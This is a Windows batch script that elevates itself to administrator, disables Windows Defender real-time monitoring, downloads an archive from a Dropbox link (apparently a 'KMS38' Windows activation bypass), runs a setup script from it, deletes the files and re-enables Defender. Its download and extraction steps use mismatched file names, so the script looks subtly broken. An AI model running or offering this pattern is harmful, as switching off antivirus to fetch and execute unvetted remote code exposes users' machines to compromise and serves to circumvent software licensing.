@NET SESSION > NUL 2> NUL || PowerShell -Command "Start-Process \"%0\" -Verb RunAs" && EXIT
@ECHO OFF
CD /D "%~dp0\..\Extra\"

PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

PowerShell -Command "(new-object System.Net.WebClient).DownloadFile('https://www.dropbox.com/s/0uxmfwc9o0hi944/hwid.kms38.gen.mk6.zip?dl=1','hwid.kms38.gen.mk6')"
PowerShell -Command "Expand-Archive -Path hwid.kms38.gen.mk6.zip -DestinationPath hwid.kms38.gen.mk6"

CALL hwid.kms38.gen.mk6\SetupComplete.cmd
RD /S /Q hwid.kms38.gen.mk6
DEL hwid.kms38.gen.mk6.zip

PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"

PAUSE
